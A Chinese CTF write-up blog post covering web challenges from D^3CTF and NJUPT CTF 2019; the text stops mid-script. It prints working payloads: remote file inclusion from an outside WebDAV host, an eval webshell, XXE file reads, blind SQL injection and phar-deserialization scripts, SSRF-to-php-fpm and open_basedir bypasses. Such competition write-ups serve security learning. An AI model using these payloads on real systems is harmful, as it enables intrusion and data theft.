<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 D^3 &amp;&amp; NJUPT ctf Web部分题解WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#D-3CTF"><span class="toc-number">1.</span> <span class="toc-text">D^3CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeonlinephp"><span class="toc-number">1.1.</span> <span class="toc-text">fakeonlinephp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NJUPT-CTF"><span class="toc-number">2.</span> <span class="toc-text">NJUPT CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-XML-cookbook"><span class="toc-number">2.1.</span> <span class="toc-text">Fake XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#True-XML-cookbook"><span class="toc-number">2.2.</span> <span class="toc-text">True XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi"><span class="toc-number">2.3.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-matches-everything"><span class="toc-number">2.4.</span> <span class="toc-text">phar matches everything</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">2.5.</span> <span class="toc-text">easyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一层过滤"><span class="toc-number">2.5.1.</span> <span class="toc-text">第一层过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二层过滤"><span class="toc-number">2.5.2.</span> <span class="toc-text">第二层过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三层过滤"><span class="toc-number">2.5.3.</span> <span class="toc-text">第三层过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace"><span class="toc-number">2.6.</span> <span class="toc-text">replace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask"><span class="toc-number">2.7.</span> <span class="toc-text">flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-your-Shell"><span class="toc-number">2.8.</span> <span class="toc-text">Upload your Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-xss"><span class="toc-number">2.9.</span> <span class="toc-text">simple_xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacker-backdoor"><span class="toc-number">2.10.</span> <span class="toc-text">hacker_backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-website"><span class="toc-number">2.11.</span> <span class="toc-text">flask_website</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">87</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 D^3 &amp;&amp; NJUPT ctf Web部分题解WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-25</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这周末本来想打D^3，但是难度太大了实在不会。就一边解南邮的NJUPT ctf了，所以两场比赛的wp就放在一起吧。D^3最后就解出一道题2333，太菜了，后面等wp出来得好好复现了。<a id="more"></a></p>
<h2 id="D-3CTF"><a href="#D-3CTF" class="headerlink" title="D^3CTF"></a>D^3CTF</h2><h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="string">'orange'</span>]) &amp;&amp; @substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">'@&lt;?php'</span> ? <span class="keyword">include</span>($_) : highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>有原题，但是不是原来的打法，因为这里是windows系统</p>
<p>尝试远程包含，发现是windows服务器，而且allow_url_include没有开 </p>
<p><img src="../../../../img/d3/4.png" alt=""> </p>
<p>正常情况下无法远程包含，但是因为是windows，可以绕过<strong>allow_url_include</strong>的限制<strong>RFI</strong>，参考：</p>
<p><a href="https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a></p>
<p>首先启用WebDAV：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></table></figure>

<p>启用后在~/webdav/data下放置php文件</p>
<p><img src="../../../../img/d3/5.png" alt=""></p>
<p>包含：?orange=//106.15.250.162//webdav/test.php</p>
<p><img src="../../../../img/d3/6.png" alt=""></p>
<p>尝试写入eval一句话，发现好像有过滤，写入assert可以</p>
<p>然后通过assert写入一句话：</p>
<p><code>cmd=file_put_contents(&#39;../somnus&#39;,&#39;@&lt;?php eval(($_POST){somnus})?&gt; ;&#39;);</code></p>
<p><img src="../../../../img/d3/7.png" alt=""></p>
<p>然后蚁剑连接，搜索目录，没发现flag</p>
<p>尝试扫描内网发现存在内网ip 172.19.97.8</p>
<p><img src="../../../../img/d3/8.png" alt=""></p>
<p>估计要内网渗透，但是估计别人直接渗透完忘记删net session了，可以直接远程访问列目录，flag.txt就在管理员桌面下</p>
<p><img src="../../../../img/d3/2.png" alt=""></p>
<p><img src="../../../../img/d3/3.png" alt=""></p>
<h2 id="NJUPT-CTF"><a href="#NJUPT-CTF" class="headerlink" title="NJUPT CTF"></a>NJUPT CTF</h2><h3 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h3><p>用户名字段存在有回显xxe，payload直接打，flag在根目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/1.png" alt=""></p>
<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>同样有回显，但是flag路径不知道，读取源码没看到可以利用的点，只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：<strong>/etc/hosts</strong>，<strong>/proc/net/arp</strong>，<strong>/proc/net/fib_trie</strong></p>
<p>在arp表中发现很多内网ip：</p>
<p><img src="../../../../img/njupt/2.png" alt=""></p>
<p>然后一个个试，最终访问到192.168.1.8这个ip得到flag</p>
<p><img src="../../../../img/njupt/3.png" alt=""></p>
<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> passwd=<span class="string">''</span></span><br></pre></td></tr></table></figure>

<p>简单测试一下，发现过滤了如下关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, &apos; &quot; and or # - + = 空格</span><br></pre></td></tr></table></figure>

<p>过滤了单引号，只能用反转义<code>\</code>来闭合，但是又过滤了所有注释符，于是就想到用<code>;%00</code>来<strong>截断</strong>最后末尾的单引号</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123\&amp;passwd=||1;%00</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/4.png" alt=""></p>
<p>登陆成功，302跳转到welcome.php</p>
<p><img src="../../../../img/njupt/5.png" alt=""></p>
<p>提示我们要通过注入获取密码password</p>
<p>回到原来的登陆页面，目前只有登陆失败和成功的区别（302跳转），只能考虑盲注</p>
<p>继续fuzz测试，发现过滤了如下关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr mid select () ,</span><br></pre></td></tr></table></figure>

<p>闭合括号中没有东西<code>()</code>会被黑名单过滤</p>
<p>截取字符串函数只剩下<code>right</code>和<code>left</code>，但是又过滤了逗号，没办法截取字符了，只剩下一个可以利用的<code>ascii</code>，而且判断的关键字<code>=</code>，<code>&lt;&gt;</code>，<code>like</code>也被过滤了，只剩下<code>regexp</code>可以利用</p>
<p>而且既然过滤了<code>select</code>，我们也不可能去执行查询，只能构造简单的判断字段的语句</p>
<p>最后就想到了如下判断语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=||passwd/**/regexp/**/0x79;%00</span><br></pre></td></tr></table></figure>

<p>因为0x可以表示十六进制，<code>regexp</code>又可以逐个字符来进行正则匹配，我们就可以逐一字符的判断，测试如下：</p>
<p><img src="../../../../img/njupt/7.png" alt=""></p>
<p>先通过ascii手动爆破出第一位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123\&amp;passwd=||ascii(passwd)/**/regexp/**/121;%00</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/8.png" alt=""></p>
<p>发现是<code>y</code></p>
<p>接下来exp爆破：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:40005/index.php"</span></span><br><span class="line">string = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span></span><br><span class="line">password = <span class="string">"y"</span></span><br><span class="line">hex_password = <span class="string">"0x79"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        payload = <span class="string">"/**/||passwd/**/regexp/**/"</span>+hex_password+s+<span class="string">";"</span>+chr(<span class="number">0</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"123\\"</span>,</span><br><span class="line">            <span class="string">"passwd"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"try to make"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            hex_password = hex_password + s</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/10.png" alt=""></p>
<p>爆破出密码：<strong>you_will_never_know7788990</strong></p>
<p>登陆任意用户名即可获得flag</p>
<p><img src="../../../../img/njupt/9.png" alt=""></p>
<h3 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h3><p>打开靶机，有个上传功能和检测图片类型的功能</p>
<p><img src="../../../../img/njupt/11.png" alt=""></p>
<p>这题直接告诉我们是phar反序列化，并且题目描述给了：*<em>I hate VIM. *</em></p>
<p>说明应该存在swp源码泄露，打开靶机，逐个测试存在页面的swp文件，发现存在：<strong>.catchmime.php.swp</strong> </p>
<p>恢复得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很显然，通过<code>getimagesize</code>函数可以触发phar反序列化<code>Main</code>类，再通过<code>$_GET[&#39;careful&#39;]</code>反序列化<code>Easytest</code>类，构造链最终进行SSRF</p>
<p>POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $test;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test = <span class="string">'1'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $url;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;url = <span class="string">"file:///etc/passwd"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$e = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($e));</span><br><span class="line">$f=<span class="keyword">new</span> Main();</span><br><span class="line"><span class="comment">//echo serialize($f);</span></span><br><span class="line">$jpg_header = hex2bin(<span class="string">'FFD8FFE000104A46494600010100000100010000FFDB004300080606070605080707070909080A0C140D0C0B0B0C1912130F141D1A1F1E1D1A1C1C20242E2720222C231C1C2837292C30313434341F27393D38323C2E333432FFDB0043010909090C0B0C180D0D1832211C213232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232FFC0'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"somnus.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub($jpg_header.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意上传带有文件后缀名<code>jpeg</code>的检测和<code>getimagesize</code>检测图片类型必须是<code>jpeg</code>，所以需要在Phar的头部加入<code>jpg</code>的文件头，这里我随便截取了一个jpg图片的头部的前几段16进制，只要能过检测上传就可以了</p>
<p>成功上传的结果图：</p>
<p><img src="../../../../img/njupt/12.png" alt=""></p>
<p>然后就是进行触发phar反序列化，赋值get参数<code>careful</code>反序列化<code>Easytest</code></p>
<p>payload：</p>
<p><img src="../../../../img/njupt/13.png" alt=""></p>
<p>但是不知道flag路径，读源码也没有线索</p>
<p>读一下<strong>/etc/hosts</strong>，只发现本机内网ip：<strong>10.0.0.2</strong>，没有其他主机的ip信息，想到了题目给的提示：*<em>they are very close *</em></p>
<p>随手测了一下ip：<strong>10.0.0.3</strong>，没想到还真有结果：</p>
<p><img src="../../../../img/njupt/14.png" alt=""></p>
<p>那么思路就是通过<strong>ssrf+gopher</strong>打fpm，可以参考evoa师傅的脚本：<a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">https://evoa.me/index.php/archives/52/#toc-SSRFGopher</a> </p>
<p>生成执行phpinfo的payload：</p>
<p><img src="../../../../img/njupt/15.png" alt=""></p>
<p><img src="../../../../img/njupt/16.png" alt=""></p>
<p>发现open_basedir：<strong>/var/www/html:/tmp</strong>，并且禁用了系统命令函数<code>system</code>等</p>
<p>于是直接套绕open_basedir的payload即可：</p>
<p><img src="../../../../img/njupt/17.png" alt=""></p>
<p><img src="../../../../img/njupt/18.png" alt=""></p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br></pre></td></tr></table></figure>

<p>bypass waf rce，后面代码分为三层过滤</p>
<h4 id="第一层过滤"><a href="#第一层过滤" class="headerlink" title="第一层过滤"></a>第一层过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>%0a</code>绕过<code>preg_match</code>的检测：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=23333%0a</span><br></pre></td></tr></table></figure>

<h4 id="第二层过滤"><a href="#第二层过滤" class="headerlink" title="第二层过滤"></a>第二层过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个md5一开始不相等，进行<code>strtr</code>的替换后相等，想到了<code>0e</code>开头，后面全是数字的字符串是相等的</p>
<p>要注意的是<code>$string_1</code>必须通过<code>is_numeric</code>的检测，那么就写个脚本爆破一个哪个数字经过md5后加密后，是<code>0e</code>开头的，并且后面除数字外只包含<code>cxhp</code>字符，这样，经过<code>strtr</code>替换后，得到的字符串就是<code>0e</code>开头，后面全是数字了</p>
<p>爆破exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>):</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    j = md5(str(i))</span><br><span class="line">    <span class="keyword">print</span> j + <span class="string">"   "</span>+str(i)</span><br><span class="line">    <span class="keyword">if</span> j[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> j[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> z <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"0123456789c"</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span 